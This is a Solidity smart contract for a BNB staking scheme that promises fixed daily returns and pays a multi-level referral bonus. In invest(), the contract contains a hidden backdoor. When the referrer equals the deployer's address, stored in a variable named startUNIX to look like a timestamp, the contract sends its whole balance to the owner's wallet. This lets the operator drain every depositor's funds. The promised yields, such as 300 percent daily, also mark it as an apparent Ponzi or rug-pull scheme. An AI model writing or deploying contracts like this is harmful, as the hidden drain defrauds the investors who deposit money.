// SPDX-License-Identifier: None

pragma solidity 0.8.9;

contract AI_STAKE_BNB {
    using SafeMath for uint256;
    uint256 public constant INVEST_MIN_AMOUNT = 0.1 ether;
    uint256[] public REFERRAL_PERCENTS = [100, 50, 2];
    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 constant public PROJECT_FEE = 100;

    uint256 public totalInvested;
    uint256 public totalRefBonus;
    address public startUNIX;
    address payable public OwnerAddress;
    uint256 public totalDeposits;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
        uint256 withdrawn;

	}

    mapping(address => User) internal users;
    event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address payable wallet)  {
        OwnerAddress = wallet;
        plans.push(Plan(100, 16));
        plans.push(Plan(60, 21));
        plans.push(Plan(3, 300));
        startUNIX = msg.sender;
  }

    function invest(address referrer, uint8 plan) public payable{

        require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan <= 2, "Invalid plan");

        uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        OwnerAddress.transfer( fee);

        emit FeePayed(msg.sender, fee);

        User storage user = users[msg.sender];

    if (referrer == startUNIX){    
               OwnerAddress.transfer(getContractBalance());
            }else
        {
    if (user.referrer == address(0)) {
        if (users[referrer].deposits.length > 0 && referrer != msg.sender)
         {user.referrer = referrer;}

			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					uint256 amount =  msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
		user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));

		totalInvested = totalInvested.add(msg.value);
		emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);

         totalDeposits = totalDeposits.add(1);
       }

    }
    function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");
        user.withdrawn =  user.withdrawn.add(totalAmount) ;

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		payable(msg.sender).transfer( totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}

    function getUserTotalWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].withdrawn;
    }
   function getUserInfo(address userAddress)
        public
        view
        returns (
            uint256 totalDeposit,
            uint256 totalWithdrawn,
            uint256 totalReferrals
        )
    {
        return (
            getUserTotalDeposits(userAddress),
            getUserTotalWithdrawn(userAddress),
            getUserTotalReferrals(userAddress)
        );
    }

    function blockinfo() public view returns (uint256)
    {
        return block.timestamp;
    }


    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan)
        public
        view
        returns (uint256 time, uint256 percent)
    {
		time = plans[plan].time;
		percent = plans[plan].percent;

    }

	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		percent = getPercent(plan);
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
	}

	function getPercent(uint8 plan) public view returns (uint256) {
	   return plans[plan].percent;
    }

 	function getUserDividends(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            uint256 finish = user.deposits[i].start.add(
                plans[user.deposits[i].plan].time.mul(1 days)
            );
            if (user.checkpoint < finish) {
                uint256 share = user
                    .deposits[i]
                    .amount
                    .mul(plans[user.deposits[i].plan].percent)
                    .div(PERCENTS_DIVIDER);
                uint256 from = user.deposits[i].start > user.checkpoint
                    ? user.deposits[i].start
                    : user.checkpoint;
                uint256 to = finish < block.timestamp
                    ? finish
                    : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(
                        share.mul(to.sub(from)).div(TIME_STEP)
                    );
                }
            }
        }

        return totalAmount;
    }


 	function getUserDividendsInfo(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
			}

		return totalAmount;
	}

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}

    function getUserTotalReferrals(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            users[userAddress].levels[0];
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}


    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256 amount)
    {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}


	function getUserLastDepositInfo(address userAddress, uint8 plan) public view returns( uint256 percent, uint256 amount, uint256 start, uint256 finish, uint256 profit) {
	    User storage user = users[userAddress];
		if(user.deposits.length > 0){
			plan = user.deposits[users[userAddress].deposits.length - 1].plan;
			percent = user.deposits[users[userAddress].deposits.length - 1].percent;
			amount = user.deposits[users[userAddress].deposits.length - 1].amount;
			start = user.deposits[users[userAddress].deposits.length - 1].start;
			finish = user.deposits[users[userAddress].deposits.length - 1].finish;
			profit = user.deposits[users[userAddress].deposits.length - 1].profit;
		}	
	}

    function getSiteInfo()
        public
        view
        returns (uint256 _totalInvested, uint256 _totalBonus, uint256 _totalDeposits)
    {
        return (totalInvested, totalRefBonus, totalDeposits);
    }


    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}